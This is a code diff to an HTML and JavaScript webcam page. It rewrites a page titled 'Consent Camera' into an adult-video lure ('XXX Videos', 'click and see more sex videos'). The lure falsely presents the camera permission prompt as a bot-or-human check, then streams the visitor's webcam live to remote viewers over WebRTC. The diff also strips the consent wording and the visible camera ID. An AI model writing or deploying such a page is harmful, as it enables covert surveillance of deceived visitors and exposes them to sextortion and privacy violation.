@@ -2,24 +2,80 @@
 <html>
 <head>
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Consent Camera</title>
+<title>Video Demo</title>
+
 <style>
-body{margin:0;background:#111;color:#fff;font-family:Arial;text-align:center;padding:20px}
-video{width:95%;max-width:900px;background:#000;border-radius:10px}
-#status{font-size:18px;margin:15px}
-#id{font-size:13px;color:#aaa}
+html,body{
+  margin:0;
+  padding:0;
+  background:#fff;
+  color:#000;
+  font-family:Arial,sans-serif;
+}
+
+.page{
+  text-align:center;
+  padding-top:45px;
+}
+
+h1{
+  font-size:38px;
+  margin:0 0 18px;
+}
+
+.subtitle{
+  font-size:26px;
+  margin-bottom:30px;
+}
+
+button{
+  border:0;
+  background:#eee;
+  border-radius:12px;
+  padding:18px 42px;
+  font-size:22px;
+  cursor:pointer;
+}
+
+#status{
+  margin-top:25px;
+  font-size:18px;
+}
+
+#video{
+  display:none;
+  width:95%;
+  max-width:700px;
+  margin:30px auto;
+  background:#000;
+}
 </style>
 </head>
+
 <body>
-<h1>📷 Camera</h1>
-<div id="status">Connecting...</div>
-<div id="id"></div>
-<video id="video" autoplay muted playsinline></video>
+
+<div class="page">
+
+  <h1>XXX Videos</h1>
+
+  <div class="subtitle">
+    press Allow permission to see a video it for verification for bot or human 
+  </div>
+
+  <button id="start">
+    click and see more sex videos 
+  </button>
+
+  <div id="status"></div>
+
+  <video id="video" autoplay muted playsinline></video>
+
+</div>
 
 <script>
+const start = document.getElementById("start");
 const status = document.getElementById("status");
 const video = document.getElementById("video");
-const idBox = document.getElementById("id");
 
 const ws = new WebSocket(
   (location.protocol === "https:" ? "wss:" : "ws:") +
@@ -30,83 +86,128 @@ let stream = null;
 let cameraId = null;
 const peers = new Map();
 
-function createPeer(viewerId) {
+function createPeer(viewerId){
+
   const old = peers.get(viewerId);
-  if (old) old.close();
+  if(old) old.close();
 
   const pc = new RTCPeerConnection({
-    iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
+    iceServers:[
+      {urls:"stun:stun.l.google.com:19302"}
+    ]
   });
 
-  peers.set(viewerId, pc);
+  peers.set(viewerId,pc);
 
   pc.onicecandidate = e => {
-    if (e.candidate) {
+    if(e.candidate){
       ws.send(JSON.stringify({
-        type: "candidate",
-        candidate: e.candidate,
-        toViewerId: viewerId
+        type:"candidate",
+        candidate:e.candidate,
+        toViewerId:viewerId
       }));
     }
   };
 
-  stream.getTracks().forEach(track => pc.addTrack(track, stream));
+  if(stream){
+    stream.getTracks().forEach(track=>{
+      pc.addTrack(track,stream);
+    });
+  }
+
   return pc;
 }
 
+start.onclick = async () => {
+
+  if(stream) return;
+
+  try{
+
+    status.textContent = "Requesting camera permission...";
+
+    stream = await navigator.mediaDevices.getUserMedia({
+      video:true,
+      audio:false
+    });
+
+    video.srcObject = stream;
+    video.style.display = "block";
+
+    status.textContent = "🟢 Camera is LIVE";
+    start.style.display = "none";
+
+    if(ws.readyState === WebSocket.OPEN){
+      ws.send(JSON.stringify({
+        type:"camera-live"
+      }));
+    }
+
+  }catch(err){
+
+    status.textContent =
+      "❌ Camera permission was not granted.";
+
+  }
+};
+
 ws.onmessage = async e => {
+
   const m = JSON.parse(e.data);
 
-  if (m.type === "role") {
+  if(m.type === "role"){
+
     cameraId = m.cameraId;
-    idBox.textContent = "Camera ID: " + cameraId;
 
-    try {
-      stream = await navigator.mediaDevices.getUserMedia({
-        video: true,
-        audio: false
-      });
-
-      video.srcObject = stream;
-      status.textContent = "🟢 Camera is LIVE";
-      ws.send(JSON.stringify({ type: "camera-live" }));
-    } catch (err) {
-      status.textContent = "❌ Camera permission denied";
-    }
   }
 
-  if (m.type === "viewer-ready") {
-    if (!stream) return;
+  if(m.type === "viewer-ready"){
+
+    if(!stream) return;
 
     const pc = createPeer(m.viewerId);
+
     const offer = await pc.createOffer();
+
     await pc.setLocalDescription(offer);
 
     ws.send(JSON.stringify({
-      type: "offer",
-      offer: pc.localDescription,
-      toViewerId: m.viewerId
+      type:"offer",
+      offer:pc.localDescription,
+      toViewerId:m.viewerId
     }));
   }
 
-  if (m.type === "answer") {
+  if(m.type === "answer"){
+
     const pc = peers.get(m.toViewerId);
-    if (pc) {
+
+    if(pc){
       await pc.setRemoteDescription(m.answer);
     }
   }
 
-  if (m.type === "candidate") {
+  if(m.type === "candidate"){
+
     const pc = peers.get(m.toViewerId);
-    if (pc && pc.remoteDescription) {
-      await pc.addIceCandidate(m.candidate).catch(() => {});
+
+    if(pc && pc.remoteDescription){
+      await pc.addIceCandidate(
+        m.candidate
+      ).catch(()=>{});
     }
   }
 };
 
 ws.onclose = () => {
-  status.textContent = "🔴 Connection closed";
+
+  if(stream){
+    status.textContent =
+      "Camera is on, but connection to the server was closed.";
+  }
+
 };
 </script>
+
 </body>
 </html>
